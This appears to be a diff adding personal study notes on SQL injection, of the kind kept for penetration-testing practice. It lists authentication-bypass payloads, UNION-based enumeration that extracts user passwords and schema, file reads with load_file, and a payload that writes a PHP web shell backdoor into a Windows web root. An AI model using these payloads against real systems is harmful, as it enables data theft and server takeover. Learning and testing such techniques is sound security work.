@@ -1,0 +1,54 @@
+SQL General Syntax Reference:
+SELECT * FROM <table>;
+This will show you things from a table.
+You can also specify properties.
+Specify an item with WHERE:
+
+SELECT username FROM users where id=1;
+
+VULN ENUMERATION:
+SQL injections can appear anywhere database interaction occurs on a webapp.
+Using a single quote ' is a good way to test for SQL injection vuln
+	if the webapp doesn't handle a single quote, it's a probable.
+String concatenation without sanitization is another good way to id vulns.
+
+AUTH BYPASS:
+f we do encounter errors when our payload is returning multiple rows, we can instruct the query to return a fixed number of records with the LIMIT statement:
+select * from users where name = 'tom' or 1=1 LIMIT 1;#
+
+' OR 1=1-- -; is a classic.
+
+
+DB ENUM:
+Passing <index> order by <num> to the db will only throw an error
+	if you go over the number of columns. This can tell you 
+	how many cols are in db.
+Using a UNION command will help us see what columns we are able to view from the 
+	site output. <url>?<param>=<val> union all select 1,2,3,4,5 
+	will attempt to show the 5 columns in the database. 
+After passing a successful union command you can build upon it by specifying params
+	instead of numbers:
+	UNION ALL SELECT 1,2,user() 
+	will show 1,2 and the db user. You can further expand this by including 
+	params and tables:
+	union all select user,id,password,flag,time from users
+	This will display the associated fields with from the users table.
+Knowing the schema (GraphQL shoutout) will give you grandular control over queries:
+	union all select 1,2 column_name from information_schema.columns where table_name = 'users'
+	This will show the column names from the users table. 
+
+
+CODE EXECUTION:
+SQL injections can also execute code using functions like load_file.
+union all select 1,2,load_file('C:\Windows\System32\drivers\etc\hosts') 
+
+You can also do LFI attacks with the into OUTFILE command:
+union all select 1,2,"<?php echo shell_exec($_GET['cmd']);?>" into outfile 'c:\xampp\htdocs\backdoor.php
+
+This will put a backdoor webshell on a windows webserver.
+
+
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+https://sylvaindurand.org/
+https://gemini.circumlunar.space/
+
